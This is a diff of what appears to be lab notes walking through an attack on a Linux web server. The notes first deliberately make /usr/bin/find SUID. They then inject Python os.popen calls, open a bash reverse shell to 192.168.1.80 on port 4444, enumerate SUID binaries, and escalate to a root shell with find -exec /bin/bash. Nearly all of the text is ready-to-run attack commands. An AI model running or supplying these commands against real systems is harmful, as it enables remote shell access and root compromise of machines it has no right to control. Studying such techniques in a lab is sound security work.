@@ -1,19 +1,42 @@
-Launch the following codes on the console to get a reverse shell
+-- Victim / Webserver Host --
+
+# Prior to the attack, we first create an SUID executable vulnerability in order to demonstrate the exploitation, we run the following command on the Find command #
+sudo chmod u+s /usr/bin/find
+This enables SUID permission on Find so that we as the attacker can exploit and launch Find as root user.
+
+-- Attacker part --
+
+# Find out the current user #
 __import__('os').popen('whoami').read();
 import os; print(os.popen("whoami").read())
 
-# Reverse shell
+
+# Reverse shell #
 __import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.1.80/4444 0>&1"').read()
 
-Simple reconnaissance:
+
+# Simple reconnaissance #
+# The ls -al command is a combination of ls -l (use a long listing format) and ls -a (do not ignore entries starting with .) #
 ls -la
 
-Prior to the attack, we first create an SUID executable vulnerability in order to demonstrate the exploitation. Next we run the following command on the Find command:
-chmod u+s /usr/bin/find
-This enables SUID permission on Find so that we as the attacker can exploit and launch Find as root user. As we now have access to victim’s machine, we will use Find command to identify binaries having SUID permission:
-find / -perm -u=s -type f 2>/dev/null
-or
+
+# Verify the Current User and Privileged allowed #
+# id command in Linux is used to find out user and group names and numeric ID’s (UID or group ID) of the current user or any other user in the server #
+id
+
+
+# As we now have access to victim’s machine, we will use Find command to identify binaries having SUID permission #
+# Find command to identify binaries having SUID permission #
 find / -type f -perm -4000 -exec ls -l {} \; 2> /dev/null
-The binary that we are interested in is the /usr/bin/find. We can now execute commands on Find using the -exec parameter to launch a privileged and interactive bash shell.
+Or
+find / -perm -u=s -type f 2>/dev/null
+
+
+# The binary that we are interested in is the /usr/bin/find. We can now execute commands on Find using the -exec parameter to launch a privileged and interactive bash shell #
+# Find command to get privileged and interactive shell #
 find /usr/bin/ -name find -exec /bin/bash -ip \;
-With this, simply run id and it will show that the uid is the user whereas the euid is root, we can now run privileged commands with the shell.
+
+
+# With this, simply run id and it will show that the uid is the user whereas the euid is root, we can now run privileged commands with the shell #
+# id command to check the user and verify root privileged #
+id
